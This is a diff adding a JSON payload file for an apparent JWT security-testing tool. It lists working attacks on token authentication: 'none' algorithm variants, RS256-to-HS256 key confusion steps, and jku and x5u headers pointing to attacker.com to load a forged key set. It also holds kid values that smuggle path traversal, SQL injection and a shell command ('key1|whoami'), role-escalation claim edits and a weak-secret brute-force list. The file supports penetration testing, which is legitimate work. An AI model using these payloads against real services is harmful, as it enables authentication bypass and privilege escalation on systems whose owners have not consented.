@@ -1,0 +1,219 @@
+{
+  "metadata": {
+    "name": "JWT Testing Payloads",
+    "version": "1.0.0",
+    "description": "JWT vulnerability testing patterns for REVUEX JWT Analyzer GOLD",
+    "author": "REVUEX Team"
+  },
+  "algorithm_attacks": {
+    "description": "Algorithm-based JWT attacks",
+    "none_algorithm": {
+      "description": "Algorithm none attack variants",
+      "variants": [
+        "none",
+        "None",
+        "NONE",
+        "nOnE",
+        "NonE"
+      ],
+      "header_template": {
+        "alg": "none",
+        "typ": "JWT"
+      },
+      "note": "Remove signature when using none algorithm"
+    },
+    "algorithm_confusion": {
+      "description": "RS256 to HS256 confusion attack",
+      "original_alg": "RS256",
+      "target_alg": "HS256",
+      "attack": "Sign with public key as HMAC secret",
+      "steps": [
+        "1. Obtain public key (from JWKS, certificate, etc.)",
+        "2. Change header alg from RS256 to HS256",
+        "3. Sign token using public key as HMAC secret",
+        "4. Submit modified token"
+      ]
+    },
+    "weak_algorithms": [
+      {"alg": "HS256", "attack": "Brute force weak secret"},
+      {"alg": "HS384", "attack": "Brute force weak secret"},
+      {"alg": "HS512", "attack": "Brute force weak secret"}
+    ]
+  },
+  "header_injection": {
+    "description": "JWT header injection attacks",
+    "jku_injection": {
+      "description": "JWKS URL injection",
+      "header": {
+        "alg": "RS256",
+        "typ": "JWT",
+        "jku": "https://attacker.com/.well-known/jwks.json"
+      },
+      "note": "Host malicious JWKS with your own key pair"
+    },
+    "jwk_injection": {
+      "description": "Embedded JWK injection",
+      "header": {
+        "alg": "RS256",
+        "typ": "JWT",
+        "jwk": {
+          "kty": "RSA",
+          "n": "<attacker_public_key_n>",
+          "e": "AQAB"
+        }
+      },
+      "note": "Embed attacker's public key directly in header"
+    },
+    "x5u_injection": {
+      "description": "X.509 certificate URL injection",
+      "header": {
+        "alg": "RS256",
+        "typ": "JWT",
+        "x5u": "https://attacker.com/cert.pem"
+      }
+    },
+    "x5c_injection": {
+      "description": "X.509 certificate chain injection",
+      "header": {
+        "alg": "RS256",
+        "typ": "JWT",
+        "x5c": ["<attacker_certificate_base64>"]
+      }
+    },
+    "kid_injection": {
+      "description": "Key ID injection attacks",
+      "path_traversal": {
+        "kid": "../../../dev/null",
+        "note": "Use empty file as key"
+      },
+      "sql_injection": {
+        "kid": "key1' UNION SELECT 'secret'--",
+        "note": "Extract secret via SQLi"
+      },
+      "command_injection": {
+        "kid": "key1|whoami",
+        "note": "If kid is used in shell command"
+      }
+    }
+  },
+  "claim_manipulation": {
+    "description": "JWT claim manipulation",
+    "identity_claims": {
+      "description": "Claims that control identity",
+      "claims": ["sub", "user_id", "uid", "user", "username", "email", "id"]
+    },
+    "privilege_claims": {
+      "description": "Claims that control privileges",
+      "claims": ["role", "roles", "admin", "is_admin", "isAdmin", "permissions", "scope", "groups"]
+    },
+    "escalation_examples": [
+      {"claim": "role", "original": "user", "modified": "admin"},
+      {"claim": "admin", "original": false, "modified": true},
+      {"claim": "is_admin", "original": 0, "modified": 1},
+      {"claim": "scope", "original": "read", "modified": "read write admin"},
+      {"claim": "groups", "original": ["users"], "modified": ["users", "admins"]}
+    ],
+    "expiration_claims": {
+      "exp": {
+        "description": "Extend token lifetime",
+        "modification": "Set to far future timestamp"
+      },
+      "nbf": {
+        "description": "Not before claim",
+        "modification": "Set to past timestamp"
+      },
+      "iat": {
+        "description": "Issued at claim",
+        "modification": "Backdate token"
+      }
+    }
+  },
+  "signature_attacks": {
+    "description": "Signature-based attacks",
+    "signature_stripping": {
+      "description": "Remove signature entirely",
+      "format": "header.payload."
+    },
+    "empty_signature": {
+      "description": "Empty signature with none alg",
+      "format": "header.payload."
+    },
+    "null_signature": {
+      "description": "Null byte in signature",
+      "technique": "Add null bytes to signature"
+    }
+  },
+  "common_weak_secrets": {
+    "description": "Common weak JWT secrets for brute force",
+    "secrets": [
+      "secret",
+      "password",
+      "123456",
+      "qwerty",
+      "jwt_secret",
+      "my_secret",
+      "your-256-bit-secret",
+      "secret123",
+      "supersecret",
+      "secretkey",
+      "jwt",
+      "key",
+      "private",
+      "changeme",
+      "admin",
+      "1234567890",
+      "0123456789",
+      "abcdefghijklmnopqrstuvwxyz",
+      "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
+      "aabbccdd",
+      "test",
+      "development",
+      "dev_secret",
+      "production_secret"
+    ]
+  },
+  "jwks_endpoints": {
+    "description": "Common JWKS endpoint locations",
+    "paths": [
+      "/.well-known/jwks.json",
+      "/.well-known/openid-configuration",
+      "/oauth/jwks",
+      "/api/jwks",
+      "/jwks.json",
+      "/keys",
+      "/api/keys",
+      "/.well-known/keys",
+      "/oauth2/keys",
+      "/auth/jwks"
+    ]
+  },
+  "detection_indicators": {
+    "description": "Indicators for vulnerability detection",
+    "algorithm_confusion": [
+      "RS* algorithm with short signature",
+      "Token accepted with HS* when RS* expected"
+    ],
+    "missing_claims": [
+      "No exp claim (never expires)",
+      "No aud claim (no audience validation)",
+      "No iss claim (no issuer validation)"
+    ],
+    "weak_binding": [
+      "Identity from JWT claims only",
+      "No session binding",
+      "No JTI for replay prevention"
+    ]
+  },
+  "test_tokens": {
+    "description": "Example test tokens for reference",
+    "hs256_secret_is_secret": {
+      "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.XbPfbIHMI6arZ3Y922BhjWgQzWXcXNrz0ogtVhfEd2o",
+      "secret": "secret",
+      "payload": {"sub": "1234567890", "name": "John Doe", "iat": 1516239022}
+    },
+    "none_algorithm": {
+      "token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
+      "note": "No signature"
+    }
+  }
+}
